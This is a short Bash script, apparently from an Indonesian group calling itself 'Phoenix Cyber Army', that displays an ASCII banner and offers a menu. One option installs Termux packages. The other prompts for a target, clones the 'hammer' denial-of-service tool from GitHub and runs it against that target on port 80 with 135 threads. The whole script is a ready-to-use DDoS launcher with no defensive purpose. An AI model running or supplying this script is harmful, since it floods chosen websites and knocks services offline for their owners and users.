#usr/bin/bash
clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
# Jangan Recode Ya gayn
# yang Recode Besok Mati Amin
clear
echo $me "                         ______ "
sleep 0.03
echo $me "              ______,---'__,---' "
sleep 0.03
echo $me "          _,-'---_---__,---' "
sleep 0.03
echo $me "   /_    (,  ---____', "
sleep 0.03
echo $me "  /  ',,   ', ,-' "
sleep 0.03
echo $me " ;/)   ,',,_/,' "
sleep 0.03
echo $me " | /\   ,.'//\ "
sleep 0.03
echo $me " '-' \ ,,'    '. "
sleep 0.03
echo $pu "      '',   ,-- '. "
sleep 0.03
echo $pu "      '/ / |      ',         _ "
sleep 0.03
echo $pu "      //'',.\_    .\\      ,{==>- "
sleep 0.03
echo $pu "   __//   __;_'-  \ ';.__,;' "
sleep 0.03
echo $pu " ((,--,) (((,------;  '--' "
sleep 0.03
echo $pu " '''  '   ''' "
sleep 0.03
echo $i 'Phoenix Cyber Army'
echo $me '==================='
sleep 0.3
echo $me [1] INSTALL
echo $pu [2] MULAI
sleep 0.1
read -p "[pilih]~#" bro


if [ $bro = 1 ] || [ $bro = 1 ]
then
pkg install python3 -y
sleep 0.1
clear
pkg update -y
sleep 0.1
clear
pkg upgrade -y
sleep 0.1
clear
pkg install python -y
sleep 0.1
clear
pkg install git -y
sleep 0.1
clear
pkg install bash -y
sleep 0.1
clear
pkg install toilet -y
sleep 0.1
clear
sh phoenix_ddos.sh
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo $i
figlet DDoS
echo   
sleep 0.1
read -p "TARGET:~# " pukqimaq
sleep 1
clear
git clone https://github.com/cyweb/hammer
sleep 0.1
clear
cd hammer
sleep 0.1
clear
python hammer.py -s $pukqimaq -p 80 -t 135
fi
